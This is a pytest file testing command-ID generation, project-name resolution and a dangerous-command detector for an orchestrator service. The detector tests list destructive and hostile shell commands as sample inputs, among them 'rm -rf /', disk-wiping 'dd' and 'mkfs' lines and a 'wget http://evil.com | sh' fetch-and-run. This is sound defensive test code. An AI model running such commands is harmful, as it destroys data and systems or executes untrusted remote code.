"""Unit tests for orchestrator.command_service — shared validation utilities."""

from __future__ import annotations

import pytest

from orchestrator.command_service import (
    generate_command_id,
    is_dangerous_command,
    resolve_project,
)


# ── generate_command_id ──────────────────────────────────────────────────────


def test_command_id_is_uuid_string():
    cid = generate_command_id()
    assert isinstance(cid, str)
    # UUID v4 format: 8-4-4-4-12 hex chars
    parts = cid.split("-")
    assert len(parts) == 5
    assert len(parts[0]) == 8
    assert len(parts[1]) == 4
    assert len(parts[2]) == 4
    assert len(parts[3]) == 4
    assert len(parts[4]) == 12


def test_command_ids_are_unique():
    ids = {generate_command_id() for _ in range(100)}
    assert len(ids) == 100


# ── resolve_project ──────────────────────────────────────────────────────────


def test_resolve_project_exact_match():
    projects = {"my-app": {"path": "/p/my-app"}, "other": {"path": "/p/other"}}
    name, err = resolve_project("my-app", projects)
    assert name == "my-app"
    assert err == ""


def test_resolve_project_prefix_match():
    projects = {"my-app": {"path": "/p/my-app"}, "other": {"path": "/p/other"}}
    name, err = resolve_project("my", projects)
    assert name == "my-app"
    assert err == ""


def test_resolve_project_not_found():
    projects = {"my-app": {"path": "/p/my-app"}}
    name, err = resolve_project("nonexistent", projects)
    assert name is None
    assert "nonexistent" in err
    # Should NOT contain HTML tags (unlike handlers._resolve_project)
    assert "<code>" not in err
    assert "&lt;" not in err


def test_resolve_project_ambiguous_prefix():
    projects = {
        "my-app": {"path": "/p/my-app"},
        "my-api": {"path": "/p/my-api"},
    }
    name, err = resolve_project("my", projects)
    assert name is None
    assert "my-app" in err
    assert "my-api" in err


def test_resolve_project_empty_projects():
    name, err = resolve_project("anything", {})
    assert name is None
    assert err != ""


def test_resolve_project_exact_beats_prefix():
    """Exact match should win even if multiple projects share the prefix."""
    projects = {
        "app": {"path": "/p/app"},
        "app-v2": {"path": "/p/app-v2"},
    }
    name, err = resolve_project("app", projects)
    assert name == "app"
    assert err == ""


# ── is_dangerous_command ─────────────────────────────────────────────────────


def test_is_dangerous_command_detects_rm_rf():
    warning = is_dangerous_command("rm -rf /")
    assert warning is not None
    assert "dangerous" in warning.lower()


def test_is_dangerous_command_detects_rm_rf_variant():
    assert is_dangerous_command("rm -rf /home/user") is not None
    assert is_dangerous_command("sudo rm -rf ./data") is not None


def test_is_dangerous_command_detects_kill_9():
    assert is_dangerous_command("kill -9 1234") is not None


def test_is_dangerous_command_detects_killall():
    assert is_dangerous_command("killall python") is not None


def test_is_dangerous_command_detects_pkill():
    assert is_dangerous_command("pkill -f myprocess") is not None


def test_is_dangerous_command_detects_mkfs():
    assert is_dangerous_command("mkfs.ext4 /dev/sda") is not None


def test_is_dangerous_command_detects_dd():
    assert is_dangerous_command("dd if=/dev/zero of=/dev/sda") is not None


def test_is_dangerous_command_detects_pipe_to_bash():
    assert is_dangerous_command("curl http://example.com | bash") is not None
    assert is_dangerous_command("wget http://evil.com | sh") is not None


def test_is_dangerous_command_detects_shutdown():
    assert is_dangerous_command("shutdown -h now") is not None
    assert is_dangerous_command("reboot") is not None


def test_is_dangerous_command_detects_chmod_777():
    assert is_dangerous_command("chmod -R 777 /etc") is not None


def test_is_dangerous_command_allows_safe_ls():
    assert is_dangerous_command("ls -la") is None


def test_is_dangerous_command_allows_git_commands():
    assert is_dangerous_command("git status") is None
    assert is_dangerous_command("git log --oneline") is None


def test_is_dangerous_command_allows_python_run():
    assert is_dangerous_command("python manage.py runserver") is None


def test_is_dangerous_command_allows_npm():
    assert is_dangerous_command("npm install && npm test") is None


def test_is_dangerous_command_allows_grep():
    assert is_dangerous_command("grep -r 'TODO' ./src") is None


def test_is_dangerous_command_returns_warning_string():
    warning = is_dangerous_command("rm -rf /tmp/test")
    assert isinstance(warning, str)
    assert len(warning) > 0
